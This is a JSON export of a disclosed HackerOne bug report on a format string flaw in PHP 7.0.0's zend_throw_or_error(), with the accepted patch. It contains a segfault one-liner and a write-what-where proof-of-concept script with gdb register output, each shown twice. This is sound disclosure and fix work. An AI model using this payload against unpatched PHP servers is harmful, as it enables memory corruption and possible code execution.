{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-01-10T18:45:33.232Z", 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 106548, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-01-10T06:59:49.906Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Format string vulnerability in zend_throw_or_error()", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-02-09T06:59:50.122Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "rewzilla", 
                "url": "/rewzilla"
            }, 
            "created_at": "2016-01-10T06:59:18.640Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-10T06:59:18.640Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 751349, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-01-10T06:59:44.046Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-10T06:59:44.046Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "rewzilla", 
                "url": "/rewzilla"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 751350, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-10T06:59:49.937Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-10T06:59:49.937Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 751351, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-10T18:45:33.259Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-10T18:45:33.259Z", 
            "actor": {
                "username": "rewzilla", 
                "url": "/rewzilla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 751798, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-10T18:45:33.431Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-10T18:45:33.431Z", 
            "actor": {
                "username": "rewzilla", 
                "url": "/rewzilla", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 751799, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "rewzilla", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/rewzilla", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 70, 
        "name": "Code Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -89135845.79702894, 
    "disclosed_at": "2016-01-10T18:45:33.409Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/106548", 
    "created_at": "2015-12-22T22:00:46.957Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"reference\">Reference:</h2>\n\n<ul>\n<li><a title=\"https://bugs.php.net/bug.php?id=71105\" href=\"/redirect?signature=bbc56091df70db2ac01dc93b7b112277f83eb036&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D71105\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=71105</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"http://www.php.net/ChangeLog-7.php#7.0.1\" href=\"/redirect?signature=923e6cf970bcd46c1f663e45c2d891006cae7e08&amp;url=http%3A%2F%2Fwww.php.net%2FChangeLog-7.php%237.0.1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.php.net/ChangeLog-7.php#7.0.1</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<h2 id=\"description\">Description:</h2>\n\n<p>A format string vulnerability exists in PHP-7.0.0 due to how non-existent class names are handled.  From my limited research I believe this issue is exploitable for full code execution (see test script below).  This issue does not appear to be present in previous PHP versions.  Also note that this is NOT the same issue as <a href=\"/redirect?signature=41b5d3fd1c950d38f7a91dbfafe797618f0d3a47&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D70895\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>#70895</span><i class=\"icon-external-link\"></i></a> or <a href=\"/redirect?signature=8ecaa9bd03b3fc5c50e6f4067ac0f16553359716&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D70914\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>#70914</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>I traced the vulnerable call to &quot;zend_throw_or_error&quot; in Zend/zend_execute_API.c:221 and created a patch to fix the issue.  This patch was accepted by the PHP team on 12/12/2015.</p>\n\n<h2 id=\"test-script\">Test script:</h2>\n\n<h3 id=\"simple-example-segfault\">Simple Example (segfault)</h3>\n<pre class=\"highlight plaintext\"><code>&lt;?php $name=&quot;%n%n%n&quot;; $name::doSomething(); ?&gt;\n</code></pre>\n<h3 id=\"write-what-where-example\">Write-what-where Example</h3>\n<pre class=\"highlight plaintext\"><code>andrew@thinkpad /tmp/php-7.0.0_64 % cat /tmp/test.php\n&lt;?php\nini_set(&quot;memory_limit&quot;, &quot;4G&quot;);\n$rdx = 0x42424242; // what\n$rax = 0x43434343; // where\n$name = &quot;%&quot; . ($rdx - 8) . &quot;d&quot; . &quot;%d&quot; . &quot;%n&quot; . str_repeat(&quot;A&quot;, ($rax - 34));\n$name::doSomething();\n?&gt;\n\nandrew@thinkpad /tmp/php-7.0.0_64 % gdb sapi/cli/php\nGNU gdb (GDB) 7.10\nCopyright (C) 2015 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;\nand &quot;show warranty&quot; for details.\nThis GDB was configured as &quot;x86_64-unknown-linux-gnu&quot;.\nType &quot;show configuration&quot; for configuration details.\nFor bug reporting instructions, please see:\n&lt;http://www.gnu.org/software/gdb/bugs/&gt;.\nFind the GDB manual and other documentation resources online at:\n&lt;http://www.gnu.org/software/gdb/documentation/&gt;.\nFor help, type &quot;help&quot;.\nType &quot;apropos word&quot; to search for commands related to &quot;word&quot;...\nReading symbols from sapi/cli/php...done.\n(gdb) r /tmp/test.php\nStarting program: /tmp/php-7.0.0_64/sapi/cli/php /tmp/test64.php\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library &quot;/usr/lib/libthread_db.so.1&quot;.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000672935 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffffa610, is_char=is_char@entry=1 &#39;\\001&#39;, fmt=&lt;optimized out&gt;, ap=0x7fffffffa658)\n    at /tmp/php-7.0.0_64/main/spprintf.c:744\n744                     *(va_arg(ap, int *)) = is_char? (int)((smart_string *)xbuf)-&gt;len : (int)ZSTR_LEN(((smart_str *)xbuf)-&gt;s);\n(gdb) i r\nrax            0x43434343   1128481603\nrbx            0x7fffb2800016   140736188121110\nrcx            0x6e 110\nrdx            0x42424242   1111638594\nrsi            0x7fffffff9db0   140737488330160\nrdi            0x7fffffffa658   140737488332376\nrbp            0x1  0x1\nrsp            0x7fffffff9d50   0x7fffffff9d50\nr8             0x7fffffff9db0   140737488330160\nr9             0x7fffb2800016   140736188121110\nr10            0x0  0\nr11            0x0  0\nr12            0x20 32\nr13            0x7fffffffa610   140737488332304\nr14            0x0  0\nr15            0x4242423a   1111638586\nrip            0x672935 0x672935 &lt;xbuf_format_converter+1845&gt;\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) x/1i $rip\n=&gt; 0x672935 &lt;xbuf_format_converter+1845&gt;:   mov    DWORD PTR [rax],edx\n(gdb)\n</code></pre>\n<h2 id=\"patch\">Patch:</h2>\n\n<p>My proposed patch, which was accepted by the PHP team in <a href=\"/redirect?signature=3dcfef3a9f520d99babe348078a74c1590da4f60&amp;url=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fb101a6bbd4f2181c360bd38e7683df4a03cba83e\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>commit b101a6b</span><i class=\"icon-external-link\"></i></a>.</p>\n<pre class=\"highlight diff\"><code><span class=\"gh\">diff -rup php-7.0.0_old/Zend/zend_execute_API.c php-7.0.0_new/Zend/zend_execute_API.c\n</span><span class=\"gd\">--- php-7.0.0_old/Zend/zend_execute_API.c   2015-12-01 07:36:25.000000000 -0600\n</span><span class=\"gi\">+++ php-7.0.0_new/Zend/zend_execute_API.c   2015-12-12 12:24:24.999391117 -0600\n</span><span class=\"gu\">@@ -218,7 +218,7 @@ static void zend_throw_or_error(int fetc\n</span>    zend_vspprintf(&amp;message, 0, format, va);\n\n    if (fetch_type &amp; ZEND_FETCH_CLASS_EXCEPTION) {\n<span class=\"gd\">-       zend_throw_error(exception_ce, message);\n</span><span class=\"gi\">+       zend_throw_error(exception_ce, &quot;%s&quot;, message);\n</span>    } else {\n        zend_error(E_ERROR, &quot;%s&quot;, message);\n    }\n\n</code></pre>", 
    "vulnerability_information": "Reference:\n------------\n * https://bugs.php.net/bug.php?id=71105\n * http://www.php.net/ChangeLog-7.php#7.0.1\n\nDescription:\n------------\nA format string vulnerability exists in PHP-7.0.0 due to how non-existent class names are handled.  From my limited research I believe this issue is exploitable for full code execution (see test script below).  This issue does not appear to be present in previous PHP versions.  Also note that this is NOT the same issue as [#70895](https://bugs.php.net/bug.php?id=70895) or [#70914](https://bugs.php.net/bug.php?id=70914).\n\nI traced the vulnerable call to \"zend_throw_or_error\" in Zend/zend_execute_API.c:221 and created a patch to fix the issue.  This patch was accepted by the PHP team on 12/12/2015.\n\n\nTest script:\n---------------\n### Simple Example (segfault) ###\n```\n<?php $name=\"%n%n%n\"; $name::doSomething(); ?>\n```\n\n\n### Write-what-where Example ###\n```\nandrew@thinkpad /tmp/php-7.0.0_64 % cat /tmp/test.php\n<?php\nini_set(\"memory_limit\", \"4G\");\n$rdx = 0x42424242; // what\n$rax = 0x43434343; // where\n$name = \"%\" . ($rdx - 8) . \"d\" . \"%d\" . \"%n\" . str_repeat(\"A\", ($rax - 34));\n$name::doSomething();\n?>\n\nandrew@thinkpad /tmp/php-7.0.0_64 % gdb sapi/cli/php\nGNU gdb (GDB) 7.10\nCopyright (C) 2015 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-unknown-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from sapi/cli/php...done.\n(gdb) r /tmp/test.php\nStarting program: /tmp/php-7.0.0_64/sapi/cli/php /tmp/test64.php\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/usr/lib/libthread_db.so.1\".\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000672935 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffffa610, is_char=is_char@entry=1 '\\001', fmt=<optimized out>, ap=0x7fffffffa658)\n\tat /tmp/php-7.0.0_64/main/spprintf.c:744\n744\t\t\t\t\t\t*(va_arg(ap, int *)) = is_char? (int)((smart_string *)xbuf)->len : (int)ZSTR_LEN(((smart_str *)xbuf)->s);\n(gdb) i r\nrax            0x43434343\t1128481603\nrbx            0x7fffb2800016\t140736188121110\nrcx            0x6e\t110\nrdx            0x42424242\t1111638594\nrsi            0x7fffffff9db0\t140737488330160\nrdi            0x7fffffffa658\t140737488332376\nrbp            0x1\t0x1\nrsp            0x7fffffff9d50\t0x7fffffff9d50\nr8             0x7fffffff9db0\t140737488330160\nr9             0x7fffb2800016\t140736188121110\nr10            0x0\t0\nr11            0x0\t0\nr12            0x20\t32\nr13            0x7fffffffa610\t140737488332304\nr14            0x0\t0\nr15            0x4242423a\t1111638586\nrip            0x672935\t0x672935 <xbuf_format_converter+1845>\neflags         0x10202\t[ IF RF ]\ncs             0x33\t51\nss             0x2b\t43\nds             0x0\t0\nes             0x0\t0\nfs             0x0\t0\ngs             0x0\t0\n(gdb) x/1i $rip\n=> 0x672935 <xbuf_format_converter+1845>:\tmov    DWORD PTR [rax],edx\n(gdb)\n```\n\nPatch:\n---------------\nMy proposed patch, which was accepted by the PHP team in [commit b101a6b](https://github.com/php/php-src/commit/b101a6bbd4f2181c360bd38e7683df4a03cba83e).\n```\ndiff -rup php-7.0.0_old/Zend/zend_execute_API.c php-7.0.0_new/Zend/zend_execute_API.c\n--- php-7.0.0_old/Zend/zend_execute_API.c\t2015-12-01 07:36:25.000000000 -0600\n+++ php-7.0.0_new/Zend/zend_execute_API.c\t2015-12-12 12:24:24.999391117 -0600\n@@ -218,7 +218,7 @@ static void zend_throw_or_error(int fetc\n \tzend_vspprintf(&message, 0, format, va);\n \n \tif (fetch_type & ZEND_FETCH_CLASS_EXCEPTION) {\n-\t\tzend_throw_error(exception_ce, message);\n+\t\tzend_throw_error(exception_ce, \"%s\", message);\n \t} else {\n \t\tzend_error(E_ERROR, \"%s\", message);\n \t}\n\n```", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}